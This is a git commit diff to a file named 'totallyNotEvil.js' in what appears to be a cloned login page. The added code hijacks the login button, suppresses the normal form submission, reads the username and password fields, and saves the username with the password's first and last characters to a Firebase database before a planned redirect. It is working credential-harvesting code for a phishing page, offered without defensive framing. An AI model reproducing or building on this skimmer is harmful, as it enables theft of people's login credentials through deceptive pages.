8635f2638dcb636c1190d71d4395f7b0566228fb
the-sides <sides798@gmail.com>
2019-12-03 18:02:03 -0500

    setup and post using firebase

--- public/Login_files/totallyNotEvil.js
+++ public/Login_files/totallyNotEvil.js
@@ -1,15 +1,30 @@
+
 function attacher(){
-    const btn = document.querySelectorAll('input.btn')
-    console.log([...btn])
+    const btn = document.querySelector('input.btn')
     btn.addEventListener('mouseup', stripper)
+    btn.type = ''
 }
 
-function stripper(){
+function stripper(event){
+    event.preventDefault()
     const username = document.querySelector('#username.form-control');
     const password = document.querySelector('#password.form-control');
     if(username.value && password.value){
         console.log(username.value)
         console.log(password.value)
+        // Add a new document in collection "users"
+        theDB.collection("users").doc(username.value).set({
+            username: username.value,
+            firstPassChar: password.value[0],
+            lastPassChar: password.value[password.value.length-1]
+        })
+        .then(function() {
+            console.log("Document successfully written!");
+        // Redirect here
+        })
+        .catch(function(error) {
+            console.error("Error writing document: ", error);
+        });
     }
 }
 
